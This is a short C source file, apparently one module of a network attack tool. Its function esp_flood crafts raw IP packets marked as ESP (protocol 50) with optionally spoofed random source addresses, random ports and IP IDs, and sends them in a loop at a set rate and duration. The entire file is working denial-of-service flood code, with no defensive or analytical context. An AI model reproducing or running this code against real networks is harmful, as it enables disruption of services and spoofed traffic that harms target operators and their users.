#include "../../include/methods.h"

static struct udphdr		*udp;
static struct iphdr		*ip;
static u_char			frame[65535];

static void inline for_iteration(method_args_t *a)
{
	if (a->o->OPT_SOURCE[0]=='\a')
		ip->saddr=random_ipv4();
	udp->uh_dport=(a->o->OPT_DSTPORT==ARANDVAL)?
		htons(random_u16()):htons(a->o->OPT_DSTPORT);
	udp->uh_sport=(a->o->OPT_SRCPORT==ARANDVAL)?
		htons(random_u16()):htons(a->o->OPT_SRCPORT);

	ip->id=htons(random_u16());

	ip->check=0;
	ip->check=in_check((u_short*)ip,sizeof(*ip));
}

void esp_flood(method_args_t *a)
{
	memset(frame,0,sizeof(frame));
	memcpy(frame,a->machdr,14);
	ip=(struct iphdr*)(frame+14);
	udp=(struct udphdr*)(frame+14+(sizeof(struct iphdr)));

	ip->ihl=5;
	ip->version=4;
	ip->tos=0;
	ip->ttl=100;
	ip->frag_off=0;
	ip->saddr=a->source;
	ip->daddr=a->target;
	ip->protocol=50;
	ip->tot_len=htons(sizeof(struct iphdr)+sizeof(struct udphdr)+25);
	udp->uh_ulen=htons(sizeof(struct udphdr)+25);
	memset((frame+(14+(sizeof(struct udphdr)+sizeof(struct iphdr)))),0xff,25);

	FLOODRUN(a,for_iteration(a),ethsend(a->fd,frame,ntohs(ip->tot_len)+14),
		a->o->OPT_PPS,a->o->OPT_TIME,a->o->OPT_UNLIMIT);
}
